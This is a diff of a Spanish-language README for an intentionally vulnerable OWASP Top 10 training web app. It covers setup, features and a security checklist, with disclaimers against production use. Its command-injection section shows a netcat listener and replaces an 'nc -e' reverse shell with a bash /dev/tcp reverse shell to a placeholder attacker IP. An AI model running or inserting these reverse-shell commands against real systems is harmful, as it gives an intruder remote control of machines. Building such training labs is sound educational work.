@@ -1,10 +1,10 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
+<img width="800" height="400" alt="OWASP Top 10 Vulnerable Web App" src="Top10_Logo.png" />
 </div>
 
 # 🛡️ Aplicación Web Vulnerable - OWASP Top 10
 
-Esta es una aplicación educativa que simula las 10 vulnerabilidades más críticas de seguridad web según OWASP.
+Esta es una aplicación educativa que simula las 10 vulnerabilidades más críticas de seguridad web según OWASP Top 10 2021.
 
 ## ⚠️ ADVERTENCIA IMPORTANTE
 Esta aplicación contiene vulnerabilidades intencionales para fines educativos. **NO usar en producción**.
@@ -103,23 +103,80 @@ Ver [DEPLOYMENT.md](DEPLOYMENT.md) para instrucciones completas de despliegue co
 1. **Kali Linux:** `nc -lvnp 4444`
 2. **Servidor:** `npm run server`
 3. **Web:** Ir a "💀 Command Injection"
-4. **Comando:** `nc -e /bin/bash TU_KALI_IP 4444`
+4. **Comando:** `bash -c 'bash -i >& /dev/tcp/TU_KALI_IP/4444 0>&1'`
 
-## 📚 Propósito Educativo
+## 🎓 Propósito Educativo
 
 Esta aplicación está diseñada para:
 - 🎓 Enseñar vulnerabilidades web
 - 🔍 Practicar pentesting ético  
 - 🛡️ Entender defensas de seguridad
 - 💡 Demostrar el impacto real de las vulnerabilidades
+- 🚨 Aprender técnicas de explotación
 
-## Run Locally
+## 🔧 Instalación Local
 
-**Prerequisites:**  Node.js
+**Prerequisitos:** Node.js (versión 16 o superior)
 
+1. **Clonar el repositorio:**
+   ```bash
+   git clone https://github.com/Kayzzii/aplicaci-n-web-vulnerable-owasp-top-10.git
+   cd aplicaci-n-web-vulnerable-owasp-top-10
+   ```
 
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
+2. **Instalar dependencias:**
+   ```bash
+   npm install
+   ```
+
+3. **Ejecutar la aplicación:**
+   ```bash
+   # Solo frontend (simulación)
+   npm run dev
+   
+   # Con backend vulnerable (comandos reales)
+   npm run server
+   ```
+
+## 🌟 Características Destacadas
+
+- **Interfaz moderna** con React + TypeScript
+- **Vulnerabilidades reales** no solo simuladas
+- **Command Injection auténtico** con reverse shells
+- **XSS que ejecuta JavaScript real**
+- **SSRF con payloads realistas**
+- **Documentación completa** de cada vulnerabilidad
+- **Ejemplos prácticos** de explotación
+
+## 📋 Lista de Verificación de Seguridad
+
+Usa esta aplicación para aprender a identificar y prevenir:
+
+- [ ] Broken Access Control
+- [ ] Cryptographic Failures  
+- [ ] Injection Attacks
+- [ ] Insecure Design
+- [ ] Security Misconfiguration
+- [ ] Vulnerable Components
+- [ ] Authentication Failures
+- [ ] Software Integrity Failures
+- [ ] Logging & Monitoring Failures
+- [ ] Server-Side Request Forgery
+
+## 🤝 Contribuciones
+
+Las contribuciones son bienvenidas. Por favor:
+
+1. Fork el repositorio
+2. Crea una rama para tu feature
+3. Commit tus cambios
+4. Push a la rama
+5. Abre un Pull Request
+
+## 📝 Licencia
+
+Este proyecto es para fines educativos únicamente.
+
+## ⚠️ Disclaimer
+
+Esta herramienta es solo para educación y testing ético. El autor no se hace responsable del uso indebido de esta aplicación.
